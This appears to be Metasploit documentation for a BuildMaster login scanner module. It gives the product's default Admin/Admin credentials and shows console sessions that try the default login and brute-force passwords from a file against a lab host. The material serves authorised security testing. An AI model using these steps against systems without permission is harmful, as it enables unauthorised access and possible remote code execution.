This module allows you to authenticate to Inedo BuildMaster, an application release automation tool. The default credentials for BuildMaster are Admin/Admin. Gaining privileged access to a BuildMaster can lead to remote code execution.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/buildmaster_login```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: Set credentials
5. Do: ```run```
6. You should see the module attempting to log in.

## Scenarios

Attempt to login with the default credentials.
```
msf > use auxiliary/scanner/http/buildmaster_login 
msf auxiliary(buildmaster_login) > set RHOSTS 10.0.0.8
RHOSTS => 10.0.0.8
msf auxiliary(buildmaster_login) > run

[+] 10.0.0.8:81 - Identified BuildMaster 5.7.3 (Build 1)
[*] 10.0.0.8:81 - Trying username:"Admin" with password:"Admin"
[+] SUCCESSFUL LOGIN - 10.0.0.8:81 - "Admin":"Admin"
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(buildmaster_login) >
```
Brute force with credentials from file.
```msf > use auxiliary/scanner/http/buildmaster_login 
msf auxiliary(buildmaster_login) > options

Module options (auxiliary/scanner/http/buildmaster_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD          Admin            no        Password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             81               yes       The target port (TCP)
   SSL               false            no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME          Admin            no        Username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts
   VHOST                              no        HTTP server virtual host

msf auxiliary(buildmaster_login) > set RHOSTS 10.0.0.8
RHOSTS => 10.0.0.8
msf auxiliary(buildmaster_login) > set USERPASS_FILE ~/BuildMasterCreds.txt
USERPASS_FILE => ~/BuildMasterCreds.txt
msf auxiliary(buildmaster_login) > run

[+] 10.0.0.8:81 - Identified BuildMaster 5.7.3 (Build 1)
[*] 10.0.0.8:81 - Trying username:"Admin" with password:"test"
[-] FAILED LOGIN - 10.0.0.8:81 - "Admin":"test"
[*] 10.0.0.8:81 - Trying username:"Admin" with password:"wrong"
[-] FAILED LOGIN - 10.0.0.8:81 - "Admin":"wrong"
[*] 10.0.0.8:81 - Trying username:"Admin" with password:"Admin"
[+] SUCCESSFUL LOGIN - 10.0.0.8:81 - "Admin":"Admin"
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(buildmaster_login) > 
```